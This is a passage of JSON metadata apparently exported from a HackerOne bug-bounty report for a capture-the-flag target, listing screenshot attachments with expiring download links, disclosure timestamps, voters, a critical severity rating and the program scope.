zSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a5b0c98feee099ef4e5c530b571a99d1b7b2f77f42055ba6aa17f899e6b69cbf",
      "file_size": 156770,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 861470,
      "file_name": "Picture5.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MSb6H3DttrM1mMMQThR4HTkh?response-content-disposition=attachment%3B%20filename%3D%22Picture5.png%22%3B%20filename%2A%3DUTF-8%27%27Picture5.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134707Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b5d06c7f0fd510ceb788205c6969a8f522e708eabeaeb06551c1ef25a106ef8e",
      "file_size": 70765,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 861471,
      "file_name": "Picture6.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4q3kKh7ziB8Nonnxna5LQNyP?response-content-disposition=attachment%3B%20filename%3D%22Picture6.png%22%3B%20filename%2A%3DUTF-8%27%27Picture6.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134707Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=420a576cd7e44956ddb79640e9f13f76a31003ccf7f1288c2efae0e362fe64cc",
      "file_size": 83111,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 861472,
      "file_name": "Picture7.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UCF4PoEt7mbKRyyJ64z2Lg2o?response-content-disposition=attachment%3B%20filename%3D%22Picture7.png%22%3B%20filename%2A%3DUTF-8%27%27Picture7.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134707Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b532dea782d0474adaa3ae254761e938c4e880d95649ae4b71628edac91ef144",
      "file_size": 124670,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-07-18T12:41:35.654Z",
  "allow_singular_disclosure_after": -112755931.92504528,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "nytr0gen",
    "brahim_boufakri01",
    "03_71"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 48138,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.bountypay.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
